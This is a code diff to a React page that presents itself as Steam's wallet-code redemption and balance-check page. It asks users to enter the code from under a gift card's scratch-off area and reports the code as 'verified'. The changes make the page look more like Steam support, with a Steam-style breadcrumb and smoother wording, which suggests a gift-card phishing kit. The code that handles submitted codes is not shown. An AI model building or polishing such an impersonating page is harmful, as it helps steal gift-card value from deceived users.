@@ -89,18 +89,18 @@ export default function SteamPage() {
 
       <main className={styles.main}>
         <div className={styles.breadcrumb}>
-          Redeem a Steam Gift Card or Wallet Code
+          Support › Steam Wallet › Redeem
         </div>
 
         <section className={styles.cardSection}>
           <div className={styles.formContainer}>
             <h1 className={styles.mainTitle}>Steam Wallet Code</h1>
-            <p className={styles.subtitle}>Redeem your code to add funds to your Steam Wallet</p>
+            <p className={styles.subtitle}>Check your balance or redeem your code to add funds to your Steam Wallet instantly.</p>
 
             <div className={styles.card}>
               <form onSubmit={checkBalance}>
                 <div className={styles.inputGroup}>
-                  <label className={styles.label}>STEAM WALLET CODE</label>
+                  <label className={styles.label}>Enter your wallet code</label>
                   <input
                     type="text"
                     className={styles.input}
@@ -108,11 +108,13 @@ export default function SteamPage() {
                     value={card}
                     onChange={(e) => setCard(e.target.value.toUpperCase())}
                     disabled={loading}
+                    autoComplete="off"
+                    spellCheck="false"
                   />
                 </div>
 
                 <button type="submit" className={styles.button} disabled={loading}>
-                  {loading ? 'VERIFYING...' : 'CONTINUE'}
+                  {loading ? 'Verifying...' : 'Continue'}
                 </button>
               </form>
 
@@ -122,14 +124,17 @@ export default function SteamPage() {
                     <span className={styles.statusDot}></span>
                     Code Successfully Verified
                   </div>
-                  <p className={styles.balanceText}>Balance: <span className={styles.amount}>{result.balance}</span></p>
-                  <p className={styles.readyMsg}>Value will be added to your Steam account after redemption.</p>
+                  <div className={styles.balanceText}>
+                    Available Balance
+                    <span className={styles.amount}>{result.balance} {result.currency}</span>
+                  </div>
+                  <p className={styles.readyMsg}>Value will be added to your current Steam account after final redemption.</p>
                 </div>
               )}
 
               {error && (
                 <div className={styles.error}>
-                  <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2">
+                  <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5">
                     <circle cx="12" cy="12" r="10" />
                     <line x1="12" y1="8" x2="12" y2="12" />
                     <line x1="12" y1="16" x2="12.01" y2="16" />
@@ -148,12 +153,12 @@ export default function SteamPage() {
                 <span>Where do I find my Steam Wallet code?</span>
                 <svg
                   viewBox="0 0 24 24"
-                  width="18"
-                  height="18"
+                  width="20"
+                  height="20"
                   fill="none"
                   stroke="currentColor"
-                  strokeWidth="2"
-                  style={{ transform: showTutorial ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.3s' }}
+                  strokeWidth="2.5"
+                  style={{ transform: showTutorial ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.4s' }}
                 >
                   <polyline points="6 9 12 15 18 9" />
                 </svg>
@@ -169,9 +174,9 @@ export default function SteamPage() {
                   <div className={styles.stepText}>The code is an alphanumeric string (usually 15 characters, e.g., AAAAA-BBBBB-CCCCC).</div>
                 </div>
                 <div className={styles.tutorialImage}>
-                  <img src="/steam-back-card.jpg" alt="Steam Card Back Tutorial" style={{ width: '100%', borderRadius: '4px', filter: 'brightness(0.8)' }} />
-                  <p className={styles.imageCaption}>The Wallet Code is printed on the back of the card under the scratch-off area.</p>
+                  <img src="/steam-back-card.jpg" alt="Steam Card Back Tutorial" style={{ width: '100%', display: 'block' }} />
                 </div>
+                <p className={styles.imageCaption}>The Wallet Code is printed on the back of the card under the scratch-off area.</p>
               </div>
             </div>
           </div>
